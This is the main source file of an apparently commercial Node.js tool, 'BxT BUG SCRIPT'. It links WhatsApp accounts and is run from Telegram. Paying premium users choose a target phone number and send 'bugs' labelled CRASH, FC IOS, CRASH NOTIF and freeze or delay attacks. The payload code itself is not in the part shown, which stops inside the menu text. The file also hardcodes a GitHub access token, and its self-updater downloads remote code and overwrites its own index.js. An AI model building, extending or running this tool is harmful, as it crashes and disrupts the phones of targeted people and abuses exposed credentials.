process.on("uncaughtException", (err) => {
  console.error("=== FULL ERROR ===");
  console.error(err.stack);
});
const config = require("./config");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const P = require("pino");
const path = require("path");
//===================================================//
//===================================================//
const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
//===================================================//
const PREMIUM_FILE = path.join(__dirname, "database", "premium.json");
//===================================================//
// BOOTSTRAP: required folders + env checks + crash guards
//===================================================//
for (const dir of [SESSIONS_DIR, path.join(__dirname, "database")]) {
  try {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  } catch (e) {
    console.error("Folder create error:", dir, e.message);
  }
}

process.on("unhandledRejection", (err) => {
  console.error("Unhandled Rejection:", err && err.message ? err.message : err);
});
process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err && err.message ? err.message : err);
});

// SECURITY: sirf .env ka BOT_TOKEN chalega. Database ka koi doosra token
// kabhi fallback ke taur par use nahi hoga.
if (!config.BOT_TOKEN) {
  console.error("[ERROR] .env me BOT_TOKEN missing hai. Bot start nahi kiya gaya.");
}
//===================================================//
// Telegram bot lazily banta hai (token resolve hone ke baad).
// Tab tak har bot.* call queue ho jati hai, kuch bhi crash nahi hota.
//===================================================//
let realBot = null;
const pendingBotCalls = [];

const bot = new Proxy(
  {},
  {
    get(_t, prop) {
      if (realBot) {
        const value = realBot[prop];
        return typeof value === "function" ? value.bind(realBot) : value;
      }
      return (...args) =>
        new Promise((resolve, reject) => pendingBotCalls.push({ prop, args, resolve, reject }));
    },
  }
);

async function startTelegramBot(finalToken) {
  if (realBot) return realBot;
  try {
    await axios.post(`https://api.telegram.org/bot${finalToken}/getMe`);
  } catch (error) {
    const status = error.response && error.response.status;
    throw new Error(
      status === 401
        ? ".env ka BOT_TOKEN Telegram ne reject kar diya (401 Unauthorized). BotFather se token dobara check karein."
        : `Telegram token verify nahi ho saka${status ? ` (HTTP ${status})` : ""}.`
    );
  }
  realBot = new TelegramBot(finalToken, { polling: true });
  realBot.on("polling_error", (e) =>
    console.error("Telegram polling error:", e && e.message ? e.message : e)
  );
  for (const call of pendingBotCalls.splice(0)) {
    try {
      Promise.resolve(realBot[call.prop](...call.args)).then(call.resolve, call.reject);
    } catch (e) {
      call.reject(e);
    }
  }
  return realBot;
}
//===================================================//
const axios = require("axios");
const photo = "https://files.catbox.moe/mdf6w7.png";
//===================================================//
// GITHUB DATABASE + UPDATE SETTINGS (sab yahi hardcoded hai)
// Repo PUBLIC hai, is liye koi GitHub token ki zaroorat nahi.
// .env me sirf BOT_TOKEN aur OWNER_ID hone chahiye.
//===================================================//
const repo_gh = "bilalnadeem3149-sketch/bilal-deta";
const repo_branch = "main"; // agar GitHub ki default branch "master" hai to "master" likho
const nama_file = "list.json";
const update_file = "index.js";
const path_ghp = "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";

// Baaki poore code ke liye config me bhi same values daal dete hain

// Update sirf /update command par hoga (koi background auto update nahi).
const AUTO_UPDATE = false;
//===================================================//
// GitHub (public repo) se file padho — pehle raw, phir API fallback
//===================================================//
async function githubGetFile(filename) {
  const noCache = { "Cache-Control": "no-cache", Pragma: "no-cache", "If-None-Match": "" };

  // 1) RAW (public repo ke liye sabse reliable + fast)
  try {
    const rawUrl = `https://raw.githubusercontent.com/${repo_gh}/${repo_branch}/${filename
      .split("/")
      .map(encodeURIComponent)
      .join("/")}`;
    const res = await axios.get(rawUrl, {
      headers: { ...noCache, Accept: "text/plain" },
      params: { _ts: Date.now() },
      transformResponse: [(d) => d],
      timeout: 20000,
    });
    return typeof res.data === "string" ? res.data : String(res.data);
  } catch (rawError) {
    // 2) API fallback
    const apiUrl = `https://api.github.com/repos/${repo_gh}/contents/${filename
      .split("/")
      .map(encodeURIComponent)
      .join("/")}`;
    try {
      const res = await axios.get(apiUrl, {
        headers: { ...noCache, Accept: "application/vnd.github+json" },
        params: { ref: repo_branch, _ts: Date.now() },
        timeout: 20000,
      });
      if (typeof res.data === "string") return res.data;
      return Buffer.from(String(res.data.content || "").replace(/\s/g, ""), "base64").toString(
        "utf-8"
      );
    } catch (apiError) {
      throw apiError.response ? apiError : rawError;
    }
  }
}

// Token ko normalize karo (spaces, newlines, quotes, zero-width chars hata do)
function normToken(t) {
  return String(t == null ? "" : t)
    .replace(/[\u200B-\u200D\uFEFF]/g, "")
    .replace(/^["'\s]+|["'\s,]+$/g, "")
    .trim();
}

// list.json kisi bhi shape me ho (array, {tokens:[]}, {premium:[]},
// [{token:"..."}], nested objects) — sab strings nikal lo.
function collectTokens(node, out = []) {
  if (node == null) return out;
  if (typeof node === "string" || typeof node === "number") {
    const v = normToken(node);
    if (v) out.push(v);
    return out;
  }
  if (Array.isArray(node)) {
    for (const item of node) collectTokens(item, out);
    return out;
  }
  if (typeof node === "object") {
    for (const val of Object.values(node)) collectTokens(val, out);
  }
  return out;
}

function explain404() {
  console.error(
    [
      "",
      "[GITHUB 404] GitHub ne repo ya file nahi mili batayi. Ye check karein:",
      `  1) Repo: "${repo_gh}" (branch: ${repo_branch}) PUBLIC hona chahiye`,
      `  2) File "${nama_file}" repo ke root me maujood honi chahiye`,
      "",
    ].join("\n")
  );
}

async function fetchAndValidateToken() {
  const myToken = normToken(config.BOT_TOKEN);
  if (!myToken) {
    console.error("[ERROR] .env me BOT_TOKEN zaroor add karein. Database ka doosra token use nahi hoga.");
    process.exit(1);
  }
  if (!/^\d{6,}:[A-Za-z0-9_-]{20,}$/.test(myToken)) {
    console.error("[ERROR] .env BOT_TOKEN ka format galat hai.");
    process.exit(1);
  }
  config.BOT_TOKEN = myToken;

  if (String(process.env.SKIP_TOKEN_CHECK).toLowerCase() === "true") {
    console.log("SKIP_TOKEN_CHECK=true — database check skip kar diya.");
    if (!config.BOT_TOKEN) {
      console.error("[ERROR] SKIP_TOKEN_CHECK=true ke saath .env me BOT_TOKEN zaroori hai.");
      process.exit(1);
    }
    return initializeBot();
  }

  let content;
  try {
    content = await githubGetFile(nama_file);
  } catch (error) {
    const status = error.response && error.response.status;

    if (status === 401 || status === 403) {
      console.error(
        `GitHub ne access deny kiya (${status}). Repo "${repo_gh}" PUBLIC hai ya rate limit lag gayi — thodi der baad try karein.`
      );
      process.exit(1);
    }

    if (status === 404) {
      explain404();
      process.exit(1);
    }

    console.error("Token check Error:", error.message);
    process.exit(1);
  }

  try {
    const db = JSON.parse(content);
    const allTokens = collectTokens(db);
    // Sirf .env wale POORE token ka exact match qabool hai.
    const myId = myToken.split(":")[0];
    const matched = allTokens.some((token) => normToken(token) === myToken);

    if (!matched) {
      console.log(
        "TOKEN IS NOT AVAILABLE IN DATABASE\nBUY THE RIGHT ONE @bilal_babar_982"
      );
      console.log(
        `[INFO] .env Bot ID: ${myId} | Database entries checked: ${allTokens.length}. ` +
          "Full exact token match nahi mila."
      );
      process.exit(1);
    }
    console.log(`Token database me exact verify ho gaya (Bot ID: ${myId}).`);
    return await initializeBot();
  } catch (e) {
    if (e && e.message === "EXIT") throw e;
    console.error(
      `Database file ("${nama_file}") padhne me masla: ${e.message}\n` +
        `Format hona chahiye: {"tokens":["..."],"premium":[]}`
    );
    process.exit(1);
  }
}

//===================================================//
// AUTO UPDATE: repo ki index.js se naya code download karke apply karo
//===================================================//
const UPDATE_STAMP = path.join(__dirname, "database", ".update_stamp");

function codeLooksValid(code) {
  if (!code || code.length < 2000) return false;
  if (!/makeWASocket|node-telegram-bot-api/.test(code)) return false;
  // Update ko token security hatane ki ijazat nahi: .env token mandatory aur
  // database me full exact match wali logic update me bhi honi chahiye.
  if (!/const myToken = normToken\(config\.BOT_TOKEN\)/.test(code)) return false;
  if (!/normToken\(token\) === myToken/.test(code)) return false;
  if (/myToken\s*=\s*botTokens\[0\]/.test(code)) return false;
  try {
    new Function(code); // syntax check (chalata nahi, sirf parse karta hai)
    return true;
  } catch (e) {
    console.error("Update code me syntax error:", e.message);
    return false;
  }
}

function missingUpdateModules(code) {
  const builtins = new Set(require("module").builtinModules.map((name) => name.replace(/^node:/, "")));
  const modules = new Set();
  const pattern = /require\s*\(\s*["']([^"']+)["']\s*\)/g;
  let match;
  while ((match = pattern.exec(code))) {
    const name = match[1];
    if (!name.startsWith(".") && !name.startsWith("/") && !builtins.has(name.replace(/^node:/, ""))) {
      modules.add(name.startsWith("@") ? name.split("/").slice(0, 2).join("/") : name.split("/")[0]);
    }
  }
  return [...modules].filter((name) => {
    try {
      require.resolve(name, { paths: [__dirname] });
      return false;
    } catch (_error) {
      return true;
    }
  });
}

async function checkAndApplyUpdate({ silent = true } = {}) {
  const localPath = path.join(__dirname, "index.js");
  const newCode = await githubGetFile(update_file);
  const currentCode = fs.readFileSync(localPath, "utf-8");

  if (newCode.trim() === currentCode.trim()) return { updated: false, reason: "latest" };
  if (!codeLooksValid(newCode)) return { updated: false, reason: "invalid" };
  const missingModules = missingUpdateModules(newCode);
  if (missingModules.length) {
    console.error(`Update roka gaya: missing package(s): ${missingModules.join(", ")}`);
    return { updated: false, reason: "missing-dependencies" };
  }

  // Ek hi version par baar baar restart na ho
  const stamp = String(newCode.length);
  try {
    if (fs.existsSync(UPDATE_STAMP) && fs.readFileSync(UPDATE_STAMP, "utf-8") === stamp) {
      return { updated: false, reason: "already-tried" };
    }
  } catch (e) {}

  fs.copyFileSync(localPath, localPath + ".bak");
  fs.writeFileSync(localPath, newCode, "utf-8");
  try {
    fs.writeFileSync(UPDATE_STAMP, stamp, "utf-8");
  } catch (e) {}

  if (silent) console.log("Naya update download ho gaya. Bot restart ho raha hai...");
  return { updated: true };
}

// Koi background auto update nahi: update sirf owner ke /update command par.
fetchAndValidateToken().catch((e) => {
  console.error("Startup error:", e && e.message ? e.message : e);
  process.exit(1);
});

//===================================================//
function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Found ${activeNumbers.length} active WhatsApp session`);

      for (const botNumber of activeNumbers) {
        console.log(`Trying to connect WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Trying to reconnect the bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Connection closed"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `╭─────────────────
│ Bot: ${botNumber}
│ Status: Initialization....
╰─────────────────`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `╭─────────────────
│ Bot: ${botNumber}
│ Status: Trying to connect...
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `╭─────────────────
│ Bot: ${botNumber}
│ Status: Unable to connect
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `╭─────────────────
│ Bot: ${botNumber}
│ Status: Connected successfully!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "BXTBRAND");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `╭─────────────────
│ Bot: ${botNumber}
│ Code: ${formattedCode}
╰─────────────────`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `╭─────────────────
│ Bot: ${botNumber}
│ Message: ${error.message}
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

let botStarted = false;
async function initializeBot() {
  if (!config.BOT_TOKEN) return;
  if (botStarted) return;
  botStarted = true;
  await startTelegramBot(normToken(config.BOT_TOKEN));
try {
 const chalk = require("chalk");     
console.log(chalk.cyan(`
██████╗ ██╗  ██╗████████╗
██╔══██╗╚██╗██╔╝╚══██╔══╝
██████╔╝ ╚███╔╝    ██║
██╔══██╗ ██╔██╗    ██║
██████╔╝██╔╝ ██╗   ██║
╚═════╝ ╚═╝  ╚═╝   ╚═╝

☠ BxT BUG SCRIPT ☠
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▀▄▀▄▀▄𝐁𝐱𝐓 𝐁𝐔𝐆 𝐒𝐂𝐑𝐈𝐏𝐓▀▄▀▄▀▄
👑 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝐁𝐢𝐥𝐚𝐥
🤝 𝐏𝐚𝐫𝐭𝐧𝐞𝐫   : 𝐈𝐭𝐱 𝐓𝐚𝐥𝐡𝐚
⚡ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧   : 𝐯𝟏.𝟎.𝟎
🚀 𝐒𝐭𝐚𝐭𝐮𝐬    : 𝐎𝐍𝐋𝐈𝐍𝐄
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`));
      await initializeWhatsAppConnections();
    } catch (error) {
      console.error(error);
    }
  }


function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}

function loadPremiumData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(PREMIUM_FILE)) {
      const data = fs.readFileSync(PREMIUM_FILE, "utf8");
      return JSON.parse(data);
    }
    return {};
  } catch (error) {
    console.error("Error loading premium data:", error);
    return {};
  }
}

function savePremiumData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving premium data:", error);
  }
}

function isPremium(userId) {
  const premiumData = loadPremiumData();
  if (!premiumData[userId]) return false;
  return premiumData[userId].expiry > Date.now();
}

function addPremiumDuration(duration) {
  const durations = {
    h: 60 * 60 * 1000,
    d: 24 * 60 * 60 * 1000,
    w: 7 * 24 * 60 * 60 * 1000,
    m: 30 * 24 * 60 * 60 * 1000,
  };

  const match = duration.match(/^(\d+)([hdwm])$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  return parseInt(amount) * durations[unit];
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

let startMessage;
let startButton;

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  startMessage = `\`\`\`javascript ${msg.from.username || msg.from.first_name}!
Hello, welcome to BxT!
My name is Bilal,and my Patner name is itx Talha and I am the developer of BxT. Thank you for choosing and using our script. We truly appreciate your support and hope you have a great experience with BxT. If you need any assistance or have any questions, we're always here to help.
Thank you for being a part of the BxT community! 💜
╭━──━ ❖ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ❖
┃⬡ Version : 4.0
┃⬡ Owner : BILAL X TALHA KINGS
┃⬡ Script : BxT vip powerful bug
╰━────────────────━❏
╭━──━ ❖ ᴛʜᴀɴᴋ ʏᴏᴜ  ❖
┃⬡ DEVELOPER : @bilal_babar_982
┃⬡ OWNER :   BILAL X TALHA KINGS
┃⬡ SUPPORT : @Itxtalha750
┃⬡ SUPPORT : @bilal_babar_982
┃⬡ PARTNER : @Itxtalha750
┃⬡ PARTNER : @bilal_babar_982
┃⬡ THANKS FOR EVERYONE 
╰━────────────────━❏

\`\`\``;

  startButton = {
  inline_keyboard: [
    [{
      text: "「 OwnerMenu 」",
      callback_data: "menu1",
      style: "success"
    }],
    [{
      text: "「 𝐁ugMenu 」",
      callback_data: "menu2",
      style: "primary"
    }]
  ]
};

  try {
    bot.sendPhoto(chatId, photo, {
      caption: startMessage,
      parse_mode: "Markdown",
      reply_markup: startButton,
    });
  } catch (error) {
    console.error("Error mengirim foto:", error);
    bot.sendMessage(chatId, startMessage, {
      parse_mode: "Markdown",
      reply_markup: startButton,
    });
  }
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access Denied*\nYou do not have permission to use this command.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "An error occurred while connecting to WhatsApp. Please try again.."
    );
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access denied*\nYou do not have permission to use this command.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
    `╭─────────────────
│    *DELETE BOT*    
│────────────────
│ Bot: ${botNumber}
│ Status: Processing...
╰─────────────────`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(
        `╭─────────────────
│    *BOT REMOVED*    
│────────────────
│ Bot: ${botNumber}
│ Status: Successfully deleted!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(
          `╭─────────────────
│    *BOT REMOVED*    
│────────────────
│ Bot: ${botNumber}
│ Status: Successfully deleted!
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(
          `╭─────────────────
│    *ERROR*    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot not found!
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(
      `╭─────────────────
│    *ERROR*    
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/addprem(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const params = match[1].trim().split(/\s+/);

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, `You don't have access`, {
      parse_mode: "Markdown",
    });
  }

  if (params.length !== 2) {
    return bot.sendMessage(
      chatId,
      "Invalid format!\nExample: /addprem <id> <duration>\nExample: /addprem 123456 30d\n┃ Duration: h=hours, d=days, w=weeks, m=months",
      { parse_mode: "Markdown" }
    );
  }

  const [userId, duration] = params;

  if (!userId || !duration) {
    return bot.sendMessage(
      chatId,
      "Format salah!\nExample: /addprem 123456 30d\n(h=hours, d=days, w=weeks, m=months)",
      { parse_mode: "Markdown" }
    );
  }

  const durationMs = addPremiumDuration(duration);
  if (!durationMs) {
    return bot.sendMessage(
      chatId,
      "Invalid duration format!\nUse: h=hours, d=days, w=weeks, m=months\nExample: 30d for 30 days",
      { parse_mode: "Markdown" }
    );
  }

  const premiumData = loadPremiumData();

  const expiry = Date.now() + durationMs;
  premiumData[userId] = {
    expiry,
    addedBy: msg.from.id,
    addedAt: Date.now(),
  };

  savePremiumData(premiumData);

  const expiryDate = new Date(expiry).toLocaleString("id-ID", {
    dateStyle: "full",
    timeStyle: "short",
  });

  await bot.sendMessage(
    chatId,
    `ID: ${userId}\nStatus: Premium Added\nExpired: ${expiryDate}`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/delprem(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = match[1].trim();

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "You don't have access", {
      parse_mode: "Markdown",
    });
  }

  if (!userId) {
    return bot.sendMessage(
      chatId,
      "Usage: /delprem <id>\nContoh: /delprem 123456",
      { parse_mode: "Markdown" }
    );
  }

  const success = removePremiumUser(userId);

  if (success) {
    await bot.sendMessage(chatId, `Premium user deleted\nID: ${userId}`, {
      parse_mode: "Markdown",
    });
  } else {
    await bot.sendMessage(chatId, `User not found`, {
      parse_mode: "Markdown",
    });
  }
});

bot.onText(/\/bxt-ios (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access Denied*\nYou do not have Premium access to use this command..",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `bxt-ios_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, photo, {
    caption: `\`\`\`
╭──────────────────────
│        ʙxᴛ Vɪᴘ   
│──────────────────────
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰──────────────────────\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/bxt-blank (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access Denied*\nYou do not have Premium access to use this command..",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `bxt-blank_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, photo, {
    caption: `\`\`\`
╭──────────────────────
│      ʙxᴛ Vɪᴘ   
│──────────────────────
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰──────────────────────\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/diandelya (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access Denied*\nYou do not have Premium access to use this command..",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `diandelya_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, photo, {
    caption: `\`\`\`
╭──────────────────────
│      ʙxᴛ Vɪᴘ   
│──────────────────────
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰──────────────────────\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/bxt-kill (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access Denied*\nYou do not have Premium access to use this command..",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `bxt-kill_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, photo, {
    caption: `\`\`\`
╭──────────────────────
│      ʙxᴛ Vɪᴘ   
│──────────────────────
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰──────────────────────\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/bxt-combo (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access Denied*\nYou do not have Premium access to use this command..",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `bxt-combo_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, photo, {
    caption: `\`\`\`
╭──────────────────────
│      ʙxᴛ Vɪᴘ   
│──────────────────────
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰──────────────────────\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/bxt-freez (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Access Denied*\nYou do not have Premium access to use this command..",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `bxt-freez_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, photo, {
    caption: `\`\`\`
╭──────────────────────
│      ʙxᴛ Vɪᴘ   
│──────────────────────
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰──────────────────────\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.on("callback_query", async (query) => {
  if (query) {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const [action, number] = query.data.split("_");
    const jid = `${number}@s.whatsapp.net`;

    if (messageId) {
      if (query.data === "menu1") {
        await bot.editMessageCaption(
          `\`\`\`javascript
[「  OwnerMenu  」]
 
Command :
- addbot <number>
- delbot <number>
- addprem <userid> <duration>
- delprem <userid> <duration>
- update  AUTO UPDATE 
\`\`\``,
          {
            chat_id: chatId,
message_id: messageId,
parse_mode: "Markdown",
reply_markup: {
  inline_keyboard: [[{
    text: "BACK",
    callback_data: "backmenu",
    style: "danger"
  }]],
},
}
);
} else if (query.data === "menu2") {
        await bot.editMessageCaption(
          `\`\`\`javascript
[「  BugMenu  」]

Command :
- /bxt-blank <number>
 ╰┈➤ BULDOZER 2-15GB 
- /bxt-delay <number>
 ╰┈➤ VC DELAY INVISIBLE 
- /bxt-ios <number>
 ╰┈➤ FC IOS
- /bxt-kill <number>
 ╰┈➤ CRASH
- /bxt-combo <number>
 ╰┈➤INVISIBLE SUPER DELAY LONG
- /bxt-freez <number>
 ╰┈➤ CRASH NOTIF
